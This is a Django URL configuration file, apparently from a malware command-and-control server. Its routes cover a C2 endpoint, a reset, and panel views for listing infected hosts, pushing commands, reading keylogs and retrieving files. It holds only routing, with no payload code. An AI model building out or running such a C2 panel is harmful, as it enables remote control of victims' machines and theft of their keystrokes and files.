"""cnc URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.9/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf import settings
from django.conf.urls import url
from django.contrib import admin
from django.conf.urls.static import static
from app import views

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^cnc/', views.cnc),
    url(r'^reset/', views.reset),

    url(r'^ui/all_malwares/', views.ui_all_malwares),
    url(r'^ui/update_command/', views.ui_update_command),
    url(r'^ui/initial_command/', views.ui_initial_command),
    url(r'^ui/keylog/', views.ui_keylog),
    url(r'^ui/file/', views.ui_file),
] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
